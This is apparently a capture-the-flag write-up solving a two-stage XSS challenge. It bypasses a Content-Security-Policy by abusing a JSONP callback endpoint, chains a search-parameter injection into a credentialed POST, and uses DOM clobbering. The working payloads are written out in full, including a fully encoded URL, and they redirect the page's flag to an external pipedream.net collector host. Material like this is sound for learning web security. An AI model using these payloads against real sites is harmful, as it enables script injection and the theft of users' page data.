XSS with search on main page
XSS with post parameter `bg` on stage 2 page

Content-Security policy blocks inline scripts but we can use `/items.php` and search for:

`<script src="/items.php?cb=alert(1)%2F%2F"></script>`

but: callback max length is 250 characters


## Script for stage 2

```js
location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()
```

```
lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--
```


## Script for stage 1

```js
x=stage2.href;fetch(x,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`});location=x;

x=stage2.href;fetch(x,{method:"post",credentials:"include",body:new URLSearchParams({bg:`lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`})});location=x;
```

```js
x=stage2.href;fetch(x,{method:"post",credentials:"include",body:new URLSearchParams({bg:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`})});location=x;
```

```
x%3Dstage2.href%3Bfetch%28x%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3A%60lang%22%5Cx3e%5Cx3chr%20id%3Dbackgrounds%20lang%3D%22%5Cx3cscript%5Cx3elocation%3D%27%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%27%2B%24%28%27b%27%29.text%28%29%22%5Cx3e%5Cx3c%21--%60%7D%29%7D%29%3Blocation%3Dx%3B
```

defer to wait for jQuery to load

```
<script defer src="/items.php?cb=x%3Dstage2.href%3Bfetch%28x%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3A%60lang%22%5Cx3e%5Cx3chr%20id%3Dbackgrounds%20lang%3D%22%5Cx3cscript%5Cx3elocation%3D%27%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%27%2B%24%28%27b%27%29.text%28%29%22%5Cx3e%5Cx3c%21--%60%7D%29%7D%29%3Blocation%3Dx%3B"></script>
```

```
http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dx%253Dstage2.href%253Bfetch%2528x%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253A%2560lang%2522%255Cx3e%255Cx3chr%2520id%253Dbackgrounds%2520lang%253D%2522%255Cx3cscript%255Cx3elocation%253D%2527%252F%252Fenbdblkpmmbod.x.pipedream.net%252F%2527%252B%2524%2528%2527b%2527%2529.text%2528%2529%2522%255Cx3e%255Cx3c%2521--%2560%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E
```

## What's happening?

1. Set search url to a `script` tag with src `items.php` where the callback is some JavaScript
2. In JavaScript: Post request to stage2 to set background to `lang"><hr id=backgrounds lang="<script>location="//enbdblkpmmbod.x.pipedream.net/"+$("b").text()"><!--`
3. Navigate to stage2
4. Background XSS will comment out the original `backgrounds` array
5. The `hr` element with `id=backgrounds` will get selected and because the `input#bg`'s value is `lang` we add the `hr`'s `lang`-value to the dom, which is a `script` tag
6. Because of the `strict-dynamic` in the `Content-Security-Policy` the `script` tag will not get blocked
7. The JavaScript in the `script` tag grabs the flag and navigates to `http://enbdblkpmmbod.x.pipedream.net/<the flag>`
8. The flag will show up in the server log

Flag: `CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`
